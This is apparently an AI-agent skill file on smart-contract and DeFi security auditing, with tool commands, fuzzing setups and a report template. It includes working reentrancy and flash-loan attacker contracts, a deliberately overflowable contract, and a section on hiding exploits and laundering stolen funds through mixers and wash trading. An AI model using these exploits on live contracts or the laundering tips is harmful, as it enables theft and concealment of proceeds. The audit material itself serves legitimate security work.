---
name: blockchain-web3
description: "Blockchain & Web3 security — Solidity/Vyper smart contract auditing, DeFi attack vectors (flash loans, MEV, oracle manipulation), bridge attacks, wallet security, with tooling from Slither/Mythril/Foundry."
origin: openclaw
version: "0.2.0.2"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: blockchain
  tool_count: 14
  guide_count: 2
  mitre: "N/A (application-layer; maps loosely to TA0001-Initial Access via compromise)"
  keywords:
    - defi
    - flash-loan
    - oracle-manipulation
    - mev
    - sandwich-attack
    - foundry
    - forge
    - anvil
    - echidna
    - certora
    - bridge-attack
  last_reviewed: "2026-11-16"
---





# Skill: Blockchain & Web3 Security

> **Supplementary Files**:
> - `payloads.md` — Command catalogue for Slither/Mythril/Echidna/Foundry plus exploit PoC code for reentrancy, flash loans, integer overflow, access control bypass, MEV, bridge attacks, oracle manipulation, proxy collisions, and Vyper-specific patterns — 15 sections with real Solidity/Vyper code.
> - `test-cases.md` — Structured test cases (Slither full run, Mythril symbolic execution, Foundry fuzzing, Echidna invariants, mainnet fork replay, reentrancy PoC, flash loan oracle manipulation PoC, integer overflow PoC, access control bypass, OpenZeppelin integration, multi-sig review, timelock review) — 12 cases across 5 categories.
> - `guides/smart-contract-audit-playbook.md` — End-to-end audit playbook: scoping → recon → static analysis → dynamic testing → fuzzing → PoC → report. Includes pre-audit checklist, SWC ID mapping, Mythril modes, mainnet fork strategy, and report template.

## Summary

Blockchain & Web3 security skill domain covering smart contract auditing, DeFi economic attacks, and wallet/dApp security.

**Tools**: Slither, Mythril, Echidna, Foundry (forge/cast/anvil), Hardhat, Brownie, Manticore, Certora Prover, Solhint, Medusa (+5 more)

**Domain**: blockchain

**MITRE ATT&CK**: N/A (application-layer; maps loosely to TA0001-Initial Access via compromise)

## Description

Audit, exploit, and harden smart contracts and DeFi protocols on EVM-compatible chains (Ethereum, Arbitrum, Optimism, Base, Polygon, BNB Chain) and Solana. This skill covers the four things that make Web3 security fundamentally different from traditional application security:

1. **Immutability** — once deployed, a contract cannot be patched. A bug in `deploy()` is forever, unless a proxy upgrade pattern was wired in from day one. The cost of a missed finding is not a CVE — it is drained liquidity.
2. **Public state by default** — every storage slot, every balance, every approval is readable by anyone. Reconnaissance is free for attackers. There is no "internal" network.
3. **Composability multiplies attack surface** — a protocol that integrates 5 other protocols inherits all of their bugs plus all the bugs created by the integration itself. The 2022 Nomad bridge incident was a single misinitialized root hash that anyone could copy-paste.
4. **Economic attacks are first-class** — flash loans let an attacker borrow billions of dollars uncollateralized for the duration of a single transaction. Oracle manipulation, sandwich attacks, and liquidation MEV have no equivalent in traditional appsec.

**Difference from `api-security`**: API security covers REST/GraphQL/gRPC authorization, rate limiting, and JWT issues. Web3 covers on-chain smart contracts where there is no rate limit, no server-side auth, and the "API" is a 500-gas function call that anyone can invoke.

**Difference from `crypto-attacks`**: Crypto-attacks covers classical cryptographic algorithm weaknesses (RSA, ECC, AES, padding oracles). Blockchain-web3 covers *application-layer* logic bugs in smart contracts and protocol design — the cryptography is sound; the code on top of it is not.

**Difference from `exploit-development`**: Exploit-development covers memory corruption, ROP chains, and binary exploitation. Web3 exploits are written in Solidity/Vyper and executed as transactions, not shellcode — but the rigor of PoC writing transfers directly.

**Difference from `supply-chain-security`**: Supply-chain covers dependency/package provenance. Web3 has its own supply-chain problem (verified source vs deployed bytecode, proxy implementation swaps, malicious token hooks) covered here.

## Use Cases

- **Pre-deploy smart contract audit**: Slither + Mythril + manual review of a protocol before mainnet deployment. Find the bug before the $50M gets drained, not after.
- **Post-incident forensics**: Given a drained address and a transaction hash, reverse-engineer the exploit, identify the root cause (reentrancy, oracle manipulation, storage collision), and write a public post-mortem.
- **DeFi protocol review**: Audit a lending DEX, AMM, or yield aggregator for flash loan attack vectors, oracle manipulation, liquidation MEV, and composability risks across integrated protocols.
- **NFT contract review**: ERC-721/ERC-1155 contracts for mint/transfer/burn logic bugs, metadata manipulation, royalty enforcement bypass, and arbitrary hook execution via `safeTransferFrom`.
- **Cross-chain bridge review**: Validator set compromise, signature replay, message-passing deserialization, and the infinitely recurring "trusted forwarder gave unlimited power to a 2-line helper" bug.
- **Wallet / dApp frontend pentest**: Walletconnect session hijack, transaction signing phishing (the "blind signing" problem), infinite token approvals, and frontend ↔ contract drift.
- **Governance attack vector review**: Vote delegation, quorum manipulation, flash-loan-voted governance proposals, timelock bypass, and multisig social engineering.
- **MEV strategy review**: From the searcher perspective, identify sandwich opportunities and frontrun-able commits; from the protocol perspective, design slippage and commit-reveal defenses.

## Core Tools

### Static Analysis

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Slither** | Solidity static analysis — 90+ detectors, inheritance graph, upgradeability checks | `slither .` or `slither Contract.sol` |
| **Mythril** | Symbolic execution — finds arithmetic, reentrancy, access control issues | `myth analyze Contract.sol --execution-timeout 300` |
| **Solhint** | Linter — style, security (SWC-aligned), and best-practice rules | `solhint 'contracts/**/*.sol'` |
| **SmartCheck** | Solidity static analysis — pattern-based checks for known weaknesses | `smartcheck -p .` |
| **Solium (deprecated, now Ethlint)** | Linter — predecessor to Solhint, still in legacy codebases | `solium --dir contracts/` |
| **Vyper analyzers** | Built-in compiler warnings + Slither Vyper support | `vyper contracts/Token.vy` + `slither --vyper .` |

### Symbolic Execution / Fuzzing / Property Testing

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Echidna** | Property-based fuzzer — define invariants, Echidna finds counterexamples | `echidna-test Contract.sol --contract Contract --test-mode property` |
| **Manticore** | Symbolic execution over EVM bytecode — deep exploration, programmatic API | `manticore contracts/Contract.sol` |
| **Foundry Invariant Testing** | Built-in invariant fuzzing — `forge test` discovers state that breaks invariants | `forge test --invariant-test` (in `forge.invariant` config) |
| **Medusa** | Parallel fuzzing harness — alternative to Echidna, faster on some workloads | `medusa fuzz --target contracts/` |
| **SMTChecker** | Built-in Solidity formal verifier — counterexamples via Z3 | `solc --model-checker-engine all Contract.sol` |

### Dynamic Analysis & Testing Frameworks

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Foundry (forge/cast/anvil)** | Rust-based toolkit — `forge` for testing/building, `cast` for RPC calls, `anvil` for local chain | `forge test -vvv` / `cast call 0x... "balanceOf(address)" 0x...` / `anvil --fork-url $RPC` |
| **Hardhat** | JS/TS framework — test, deploy, debug with stack traces | `npx hardhat test` |
| **Brownie** | Python framework — popular for DeFi scripting and testing | `brownie test -s` |
| **ApeWorx (Ape)** | Python framework — modern successor to Brownie | `ape test` |
| **web3.py / ethers.js** | Direct RPC scripting — exploit PoCs, bots, custom oracles | `web3.eth.call({...})` / `const tx = await contract.func()` |

### Bytecode Analysis & Decompilation

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Etherscan** | Source verification + bytecode viewer + transaction traces | Browse `etherscan.io/address/0x...` |
| **Dedaub** | Decompiler & simulator for unverified contracts | Paste bytecode at `app.dedaub.com/decompile` |
| **ethervm.io** | Browser-based disassembler/decompiler | Browse `ethervm.io/decompile/mainnet/0x...` |
| **Panoramix (legacy)** | Older decompiler — still useful when Dedaub misses | `panoramix Contract.bytecode` |
| **heimdall** | Modern decompiler — Rust, fast, ABI recovery | `heimdall decompile --target 0x... --rpc-url $RPC` |

### Formal Verification

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Certora Prover** | Rule-based formal verification — write rules, Prover proves or counterexamples | `certoraRun specs/Rule.spec` |
| **Halmos** | Symbolic execution built on Foundry — reuses `forge test` as property specs | `halmos --function check_` |

### DeFi-Specific & MEV

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **DeFi Security Database** | Curated incident database (Convexity, bZx, Cream, etc.) | Browse `github.com/defi-security/defi-attacks` |
| **Solcurity** | Opinionated Slither extension — extra detectors for review patterns | `slither . --detect solcurity` |
| **Flashbots Protect** | Private mempool — prevents sandwich on user txs | Submit via `rpc.flashbots.net` |
| **MEV-Inspect / MEV-Explore** | Mempool and historical MEV extraction analysis | `mev-inspect-py inspect <block>` |

## Methodology

### Smart Contract Audit Five-Phase Process

```
Phase 1            Phase 2            Phase 3            Phase 4            Phase 5
Recon & Source  →  Static Analysis →  Dynamic Testing → Fuzzing &       →  Exploit PoC +
Verification       (Slither, Mythril) (Foundry tests)   Invariants          Report
   │                  │                  │                  │                  │
   ▼                  ▼                  ▼                  ▼                  ▼
Source vs bytecode  90+ detectors,     forge test -vvv,  Echidna invariants, Concrete PoC on
match (Etherscan /  inheritance graph, mainnet fork      Foundry invariants, anvil fork,
Sourcify), protocol  SWC IDs,           replay of past    Certora rules      severity-rated
README, dependencies ownership matrix    incidents                           report with PoC
                                                          SMT counterexamples
```

**Phase 1: Recon & Source Verification**

```bash
# Verify on-chain bytecode matches Etherscan-verified source
cast code 0xTarget > deployed_runtime.bytecode
forge inspect Contract irOptimized --optimizer-runs 200 > compiled_runtime.bytecode
diff deployed_runtime.bytecode compiled_runtime.bytecode
# If diff non-empty: source ≠ deployed — re-derive or refuse to audit

# Alternative: Sourcify (decentralized verification)
curl https://repo.sourcify.dev/contracts/full_match/1/0xTarget/metadata.json | jq

# Pull protocol docs, whitepaper, prior audits
gh repo clone <protocol-org>/<protocol-repo>
cat README.md docs/*.md audits/*.pdf 2>/dev/null
```

**Phase 2: Static Analysis**

```bash
# Slither — full detector run
slither . --filter-paths "lib|test|script"
slither . --exclude naming-convention,solhint-version  # silence noise

# Mythril — symbolic execution (slow on large contracts)
myth analyze src/Vault.sol \
  --execution-timeout 600 \
  --max-depth 50 \
  --backend mythril \
  --modules arithmetic,ether_thief,transaction_order_independence

# Solhint — lint
solhint 'src/**/*.sol' --max-warnings 0
```

**Phase 3: Dynamic Testing**

```bash
# Forge — write tests for every external/public function
forge test -vvv --match-contract VaultTest

# Trace a specific failing test
forge test -vvvv --match-test testWithdraw

# Cast — read state without deploying
cast call 0xVault "totalAssets()" --rpc-url $RPC
cast storage 0xVault 0 --rpc-url $RPC  # read slot 0
```

**Phase 4: Fuzzing & Invariants**

```bash
# Foundry fuzz tests (stateless)
forge test --match-test testFuzz_RevertOnOverflow -vvv

# Foundry invariant tests (stateful)
forge test --match-test invariant_TotalSupplyNeverNegative

# Echidna — external invariant harness
echidna-test echidna/VaultEchidna.sol \
  --contract VaultEchidna \
  --test-mode property \
  --seq-len 100 \
  --test-limit 50000 \
  --workers 4

# Certora — formal property
certoraRun specs/Vault.spec \
  --msg "Vault: totalAssets >= sum(balances)"
```

**Phase 5: Exploit PoC + Report**

```bash
# Spin up a mainnet fork for the PoC
anvil --fork-url $RPC --fork-block-number 19000000

# Run the exploit as a forge test
forge test --match-test test_PoC_FlashLoanDrain -vvv \
  --fork-url $RPC \
  --fork-block-number 19000000

# Capture the trace for the report
forge test --match-test test_PoC_FlashLoanDrain -vvvv \
  --fork-url $RPC \
  --fork-block-number 19000000 2>&1 | tee evidence/poc_trace.log
```

### Quick Selection Guide

| Scenario | Primary Approach | Alternative |
|----------|------------------|-------------|
| First-pass triage of a new contract | `slither .` + `solhint` | Mythril `--quick-mode` |
| Suspected reentrancy | Slither `reentrancy-*` detectors + manual review | Echidna invariant: `balances unchanged across withdraw` |
| Suspected integer overflow (pre-0.8.0 or `unchecked {}`) | Mythril arithmetic module | Manual: trace every arithmetic op |
| Suspected oracle manipulation | Manual review of oracle source + TWAP usage | Foundry fork test: flash loan → manipulate → assert profit |
| Verify deployed bytecode = source | `forge inspect` + diff vs `cast code` | Sourcify full match |
| Replay a past exploit on a fork | `anvil --fork-block-number` before the incident | Tenderly simulation |
| Property verification (no false positives wanted) | Certora Prover | SMTChecker |
| Quick exploit PoC | `forge test --fork-url` | Brownie `brownie run scripts/poc.py` |
| Lint a team's code style | Solhint config in repo | Solium (legacy) |
| Decompile an unverified contract | Dedaub (web) | `heimdall decompile` |

### Defense Perspective

| Defense Measure | Description |
|-----------------|-------------|
| **Checks-Effects-Interactions (CEI)** | Order: validate precondition, write all state changes, then call external contracts. Prevents reentrancy by zeroing balances before external calls. |
| **OpenZeppelin ReentrancyGuard** | `nonReentrant` modifier on every function that calls out. Defense-in-depth even when CEI is followed. |
| **OpenZeppelin standards** | Use audited ERC20/ERC721/ERC4626/AccessControl/Upgradeable implementations. Do not roll your own. |
| **Multi-sig + timelock** | Admin keys behind a Gnosis Safe with M-of-N signers, plus a 48h+ timelock on every admin action. Lets users exit before a malicious upgrade lands. |
| **TWAP oracles (Uniswap V3)** | Time-weighted average prices resist single-block flash loan manipulation. Use `observe(secondsAgo)` not `slot0().sqrtPriceX96`. |
| **Slippage protection** | All swaps take `minAmountOut` parameter; revert if not met. Defends against sandwich attacks. |
| **Commit-reveal** | For MEV-sensitive operations, commit a hash on-chain, reveal later. Prevents frontrunning. |
| **Flash loan resistance** | Any state-changing function that depends on a price or balance must use a multi-block TWAP or check `block.timestamp` is consistent across calls. |
| **Verified source on Etherscan + Sourcify** | Users can review what they're signing. Deploy with `forge verify-contract` + push to Sourcify. |
| **Bug bounty (Immunefi)** | Pay whitehats more than blackhats. Standard range: 10% of funds-at-risk, capped at $1M+. |

## Practical Steps

> **Detailed payloads in `payloads.md`, complete test checklist in `test-cases.md`.**

### Exercise 1: Slither Full Detector Run on a Sample Contract

Goal: get a baseline finding list from Slither on a small contract.

```bash
# Install Slither + solc
pip3 install slither-analyzer solc-select
solc-select install 0.8.24 && solc-select use 0.8.24

# Clone a known-buggy contract (e.g., Ethernaut's Reentrance level)
git clone https://github.com/OpenZeppelin/ethernaut
cd ethernaut/contracts/attacks

# Run Slither
slither Reentrance.sol --exclude naming-convention
# Expect: reentrancy-eth, reentrancy-no-eth, timestamp, tx-origin (if applicable)
```

### Exercise 2: Mythril Symbolic Execution

Goal: see what symbolic execution catches that static analysis misses.

```bash
myth analyze Reentrance.sol \
  --execution-timeout 300 \
  --max-depth 30 \
  --modules reentrancy,transaction_order_independence,ether_thief \
  -o json > mythril_reentrance.json

# Extract counterexamples
jq '.issues[] | {swc_id, title, description, bytecode}' mythril_reentrance.json
```

### Exercise 3: Echidna Property Testing

Goal: write invariants, let Echidna find counterexamples.

```solidity
// echidna/VaultEchidna.sol
pragma solidity ^0.8.24;
import "../src/Vault.sol";

contract VaultEchidna {
    Vault internal vault;

    constructor() {
        vault = new Vault();
    }

    // Invariant: total shares never exceeds total assets (modulo rounding)
    function echidna_shares_le_assets() public view returns (bool) {
        return vault.totalShares() <= vault.totalAssets() + 1;
    }

    // Invariant: a single depositor can always withdraw their full balance
    function echidna_deposit_then_withdraw_round_trip(uint256 amt) public {
        uint256 bal_before = address(this).balance;
        vault.deposit{value: amt}();
        vault.withdraw(vault.sharesOf(address(this)));
        assert(address(this).balance >= bal_before);
    }
}
```

```bash
echidna-test echidna/VaultEchidna.sol \
  --contract VaultEchidna \
  --test-mode property \
  --test-limit 100000 \
  --seq-len 1 \
  --workers 4 \
  --corpus-dir corpus/
```

### Exercise 4: Foundry Fuzzing

Goal: stateless property fuzzing in `forge test`.

```solidity
// test/Vault.t.sol
function testFuzz_RevertOnDepositOverflow(uint256 amt) public {
    vm.assume(amt > 0 && amt < type(uint128).max);
    vault.deposit{value: amt}();
    assertEq(vault.totalShares(), amt);
}

function testFuzz_WithdrawReleasesExactBalance(uint256 deposit, uint256 withdraw) public {
    vm.assume(deposit > 0 && withdraw <= deposit);
    vault.deposit{value: deposit}();
    uint256 bal = address(this).balance;
    vault.withdraw(withdraw);
    assertEq(address(this).balance, bal + withdraw);
}
```

```bash
forge test --match-test testFuzz -vvv --fuzz-runs 10000
```

### Exercise 5: Mainnet Fork with Anvil

Goal: replay real protocol state locally and test against it.

```bash
# Freeze state at a specific block
anvil --fork-url $MAINNET_RPC --fork-block-number 19000000 --port 8545 &

# Run a test against the fork
forge test --match-test test_PoC_DrainVault \
  --fork-url http://localhost:8545 \
  --fork-block-number 19000000 \
  -vvv

# Cast: read state on the fork
cast call 0xVault "totalAssets()" --rpc-url http://localhost:8545
```

### Exercise 6: Reentrancy Exploit PoC

Goal: write a concrete exploit contract that drains a vulnerable vault.

```solidity
// test/ReentrancyPoC.t.sol
contract Attacker {
    IVault public vault;

    constructor(address _vault) { vault = IVault(_vault); }

    function pwn() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }

    // Called by vault during withdraw → re-enters before balance is zeroed
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }
}

function test_PoC_DrainViaReentrancy() public {
    Attacker attacker = new Attacker(address(vault));
    vm.deal(address(attacker), 1 ether);

    uint256 vaultBalBefore = address(vault).balance;
    attacker.pwn();

    assertEq(address(vault).balance, 0, "vault drained");
    assertGt(address(attacker).balance, vaultBalBefore, "attacker profit");
}
```

### Exercise 7: Flash Loan Attack PoC (Price Oracle Manipulation)

Goal: borrow uncollateralized via Aave, manipulate a Uniswap V2 spot price, exploit a protocol that uses that spot price as oracle.

```solidity
// test/FlashLoanPoC.t.sol
interface IAavePool {
    function flashLoan(address receiver, address[] calldata assets, uint256[] calldata amounts, bytes calldata params) external;
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract FlashLoanAttacker {
    IVictim public victim;
    IUniswapV2Pair public pair;
    IAavePool public aave;

    function attack() external {
        address[] memory assets = new address[](1);
        assets[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100_000 ether;
        aave.flashLoan(address(this), assets, amounts, "");
    }

    function executeOperation(address[] calldata, uint256[] calldata amounts, uint256[] calldata premiums, address, bytes calldata) external returns (bool) {
        // 1. Dump borrowed WETH into the pair → spot price spikes
        IERC20(WETH).transfer(address(pair), 50_000 ether);
        pair.swap(0, 1_000_000 ether, address(this), "");

        // 2. Victim uses spot price → loans us 5M against the artificially inflated collateral
        victim.borrow(5_000_000 ether);

        // 3. Reverse the price, repay Aave
        // ...
        IERC20(WETH).approve(address(aave), amounts[0] + premiums[0]);
        return true;
    }
}
```

### Exercise 8: Integer Overflow (Pre-0.8.0 or `unchecked {}`)

Goal: exploit a contract compiled pre-0.8.0 (or one that uses `unchecked {}`).

```solidity
// Vulnerable contract (pre-0.8.0 semantics, or compiled in 0.8+ with unchecked)
contract TokenStore {
    mapping(address => uint256) public balanceOf;

    function buy(uint256 amount) public payable {
        // Vulnerable: total cost wraps around if amount is huge
        unchecked {
            uint256 cost = amount * 1 ether;  // overflow → tiny number
            require(msg.value >= cost, "insufficient");
            balanceOf[msg.sender] += amount;
        }
    }
}
```

```bash
# Forge test proving the overflow
forge test --match-test test_PoC_OverflowBuy -vvv
```

### Exercise 9: Audit Report Writing

Goal: turn a finding into a structured report row.

```markdown
### [HIGH] Reentrancy in Vault.withdraw() drains all deposits

**Severity**: HIGH
**SWC ID**: SWC-107 (Reentrancy)
**Location**: src/Vault.sol:42-58

**Description**:
`Vault.withdraw()` calls `msg.sender.call{value: amount}("")` *before* zeroing
the caller's balance. A malicious contract with a `receive()` hook can re-enter
`withdraw()` to drain the full vault balance in a single transaction.

**Impact**:
Total loss of all user deposits. On mainnet deployment at block 19M with 1000
ETH TVL, the entire balance is recoverable by any address.

**Proof of Concept**:
`test/ReentrancyPoC.t.sol::test_PoC_DrainViaReentrancy` — runs against an anvil
fork and asserts the vault balance reaches 0.

**Recommendation**:
Apply Checks-Effects-Interactions: zero `balances[msg.sender]` *before* the
external call. Additionally inherit OpenZeppelin's `ReentrancyGuard` and apply
`nonReentrant` to every external function that performs an external call.
```

## Safety Notes

- **Testnet vs mainnet**: never run exploits or PoCs against mainnet contracts without explicit authorization. Use `anvil --fork-url` to replay mainnet state locally — funds drained on a fork are simulated, not real.
- **Authorization scope**: bug bounty programs (Immunefi, code4rena, Cantina) define what's in scope. Exploiting a contract outside the declared scope — even with no profit intent — is illegal in most jurisdictions.
- **Economic risk of live testing**: even reading state from mainnet is fine, but *any* transaction broadcast to mainnet (including failed ones) leaks your address and intent. MEV bots watch the public mempool and will frontrun anything profitable.
- **No live attacks**: never deploy an exploit against a contract you don't own, even if the bounty program pays retroactively. The legal status of "I exploited then returned funds" varies wildly by jurisdiction. Submit PoCs as forge tests on a fork instead.
- **Private keys**: never commit RPC URLs with embedded API keys. Never commit deployer private keys, even for testnet. Use `forge script` with `--interactive` or environment variables in `.env` (gitignored).
- **Flash loan attacks are real**: if your protocol is live and you discover a flash loan vulnerability, treat it as a 911 incident — fund retrieval is a race against anonymous searchers. Contact the team privately first, not on Twitter.
- **Immutability cuts both ways**: a deployed contract cannot be patched. If you find a bug post-deployment, the only options are (a) a proxy upgrade (if wired in), (b) a migration to a new contract, or (c) a whitehat rescue. Plan for all three.

## Detection Methods

### Smart Contract Audit Detection
- **Static analysis tools**: Slither, Mythril, Mythos; detect reentrancy, overflow, access control.
- **Formal verification**: Certora, K Framework; proves contract behavior against spec.
- **Fuzz testing**: Echidna, Harvey; finds assertion violations via randomized inputs.
- **Runtime monitoring**: Forta, OpenZeppelin Defender; live detection of exploit patterns.

### On-Chain Anomaly Detection
- **Gas price spikes**: Sudden gas price increase; MEV extraction or DoS attack.
- **Token transfer patterns**: Large transfers to newly-created contracts; potential exploit.
- **Flash loan signatures**: Borrow + multiple protocol interactions + repay in single tx.
- **Sandwich attack patterns**: Same-block swap + opposite-direction swap sandwiching victim.

### SIEM Detection Rules
- **Splunk SPL (Web3)**: `index=web3 method="eth_getLogs" | stats count by address | where count > 1000`
- **Forta bots**: Community-built detection bots for emerging threats.
- **Chainalysis / TRM Labs**: Transaction monitoring for sanctioned addresses.
- **Etherscan token approval alerts**: User notification for suspicious token approvals.

## Defense Evasion Techniques

### Smart Contract Exploit Stealth
- **Obfuscate exploit logic**: Use complex math to hide malicious behavior; defeats Slither.
- **Use assembly/Yul**: Bypass Solidity safety checks; lower-level manipulation.
- **Self-destruct after exploit**: `selfdestruct` to make contract unrecoverable for analysis.
- **Use CREATE2**: Pre-compute address; deploy malicious contract at known address later.
- **Proxy pattern abuse**: Use upgradeable proxy to deploy "update" that drains funds.

### On-Chain Laundering
- **Tornado Cash**: 100 ETH denominations; breaks deterministic trace.
- **Railgun**: Privacy-preserving DEX; zk-based shielding.
- **Cross-chain bridges**: Hop, Across, Stargate; spread funds across L2s.
- **Mixers + DEX**: Mixer → DEX swap → mixer; multiple currency swaps break trace.
- **NFT wash trading**: Convert ETH to NFT, transfer NFT, sell on different marketplace.

### MEV / Front-Running Stealth
- **Private mempools**: Flashbots Protect, Merkle, BloXroute; avoid public mempool visibility.
- **MEV boost**: Use block builder auctions; ensure transaction inclusion.
- **Back-running**: Wait for victim transaction; exploit immediately after (no frontrun needed).
- **Sandwich in same block**: Use builder to ensure ordering; no public mempool visibility.

## Hacker Laws

- **Trust but Verify** — A verified Etherscan source is not proof the deployed bytecode matches. Diff the compiled source against `cast code` (or use Sourcify full-match). Half of all "post-incident surprises" were unverified or drifted contracts.
- **Defense in Depth** — A single defense (CEI) is not enough. Layer `nonReentrant` + slippage protection + multi-sig admin + timelock + bug bounty. The 2016 DAO hack had CEI; it also had a recursive call path CEI didn't cover.
- **First Principles** — Every DeFi exploit reduces to: state written out of order, arithmetic miscomputed, or oracle lied. Memorize the three; spot every instance.
- **Minimize Attack Surface** — Composability multiplies surface. Every external contract your protocol calls is a new attack surface. Whitelist trusted callers; minimize external calls; quarantine untrusted tokens via sandboxed wrappers.
- **Information Wants to Be Free** — All on-chain state is public. There is no "internal" function on a verified contract. Treat the bytecode as the source of truth, not the README.
- **Obscurity Is Not Security** — "We didn't verify on Etherscan to hide our logic" is not a defense — anyone can decompile bytecode with Dedaub or heimdall in seconds.
- **Weakest Link Is Human** — Most bridge hacks are not crypto failures; they are social engineering of multisig signers, or a single compromised frontend signing a malicious tx. Audit the humans and the frontend, not just the contract.

## Learning Resources

- **This skill's supplementary files**: `payloads.md`, `test-cases.md`
- **Deep-dive guide**: `guides/smart-contract-audit-playbook.md` — end-to-end audit workflow with SWC mapping, Mythril modes, mainnet fork strategy, PoC templates, and report structure
- **Related skills**:
  - `skills/api-security/SKILL.md` — for dApp backends and the REST/RPC layer in front of contracts
  - `skills/crypto-attacks/SKILL.md` — for the cryptographic primitives blockchains are built on (ECDSA, BLS)
  - `skills/exploit-development/SKILL.md` — for PoC writing rigor (transferable to Solidity PoC writing)
  - `skills/repo-scan/SKILL.md` — for source-code review of the contract repo itself
  - `skills/web-auth-bypass/SKILL.md` — for the auth layer protecting the RPC frontend
  - `skills/pentest-reporting/SKILL.md` — for structuring the audit deliverable
- **External resources**:
  - SWC Registry: [swcregistry.io](https://swcregistry.io) — Smart Contract Weakness Classification
  - Ethernaut (OpenZeppelin): [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com) — wargame
  - Damn Vulnerable DeFi: [damnvulnerabledefi.xyz](https://damnvulnerabledefi.xyz) — DeFi-focused wargame
  - OpenZeppelin Contracts: [docs.openzeppelin.com/contracts](https://docs.openzeppelin.com/contracts)
  - Foundry Book: [book.getfoundry.sh](https://book.getfoundry.sh)
  - Slither documentation: [github.com/crytic/slither](https://github.com/crytic/slither)
  - Mythril documentation: [github.com/Consensys/mythril](https://github.com/Consensys/mythril)
  - Echidna: [github.com/crytic/echidna](https://github.com/crytic/echidna)
  - Certora: [docs.certora.com](https://docs.certora.com)
  - Immunefi: [immunefi.com](https://immunefi.com) — bug bounty platform
  - Rekt Database: [rekt.news/leaderboard](https://rekt.news/leaderboard) — incident database
  - DeFi Security Database: [github.com/defi-security/defi-attacks](https://github.com/defi-security/defi-attacks)
- **Core system files**: `SOUL.md`, `TOOLS.md`, `IDENTITY.md`
